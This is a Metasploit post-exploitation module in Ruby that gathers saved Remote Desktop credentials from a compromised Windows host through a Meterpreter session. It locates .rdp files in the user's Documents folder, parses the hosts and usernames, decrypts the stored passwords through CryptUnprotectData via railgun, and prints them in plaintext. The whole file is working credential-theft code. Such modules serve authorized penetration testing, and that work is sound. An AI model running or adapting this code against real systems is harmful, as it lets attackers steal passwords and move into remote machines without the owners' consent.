##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather RDP Saved Password Extraction',
			'Description'   => %q{ This module finds saved login credentials
				for the Remote Desktop client for windows.
				It finds the saved passwords and decrypts
				them.},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'illwill <illwill@illmob.org>'],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end

	def run
		prepare_railgun
		docs = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 'Personal')
		print_status("Searching for *.rdp files in #{docs}")
		recurse = false
		glob = "*.rdp"

		files = client.fs.file.search( docs, glob, recurse )
	
		if( not files.empty? )
			files.each do | file |
				rdpfile = ("#{file['path']}\\#{file['name']}")
				check_rdp rdpfile
			end
		else
			print_status( "No files matching your search were found." )
		end
	end

	def check_rdp(path)
		filename = path
		found = session.fs.file.stat(filename) rescue nil
		return if not found

		print_line("\r")
		print_status("Found: #{filename}")
		
		output = ::File.open(filename)
		output.readlines.each do |line|
			hex_str = line.gsub("\x00", "")	 #strip the zeroes
			if hex_str.match(/^full address:s:.*/)
				third = hex_str.split(':')[2]
				print_status("Host: " + third.rstrip)
				third = ""
			end
			
			if hex_str.match(/^username:s:.*/)
				third = hex_str.split(':')[2]
				print_status("User: " + third.rstrip)
				third = ""
			end
			
			if hex_str.match(/^password 51:b:.*/)
				third = hex_str.split(':')[2]
				rdppass = (third.rstrip)
				rdppass = [rdppass].to_a.pack("H*")
				pass = decrypt_data(rdppass)
				hex_str = pass.unpack('v*').pack('C*')
				print_status("Pass: " + hex_str.rstrip)
				third = ""
			end
		end
	end
	
	def prepare_railgun
		rg = session.railgun
		if (!rg.get_dll('crypt32'))
			rg.add_dll('crypt32')
		end
		
		if (!rg.crypt32.functions["CryptUnprotectData"])
			rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
				["PBLOB","pDataIn", "in"],
				["PWCHAR", "szDataDescr", "out"],
				["PBLOB", "pOptionalEntropy", "in"],
				["PDWORD", "pvReserved", "in"],
				["PBLOB", "pPromptStruct", "in"],
				["DWORD", "dwFlags", "in"],
				["PBLOB", "pDataOut", "out"]
			])
		end
	end

	def decrypt_data(data)
		rg = session.railgun
		pid = session.sys.process.open.pid
		process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

		mem = process.memory.allocate(1350)
		process.memory.write(mem, data)

		if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
			addr = [mem].pack("V")
			len = [data.length].pack("V")
			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
			len, addr = ret["pDataOut"].unpack("V2")
		else
			addr = [mem].pack("Q")
			len = [data.length].pack("Q")
			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
			len, addr = ret["pDataOut"].unpack("Q2")
		end
		
		return "" if len == 0
			decrypted = process.memory.read(addr, len)
		return decrypted
	end
end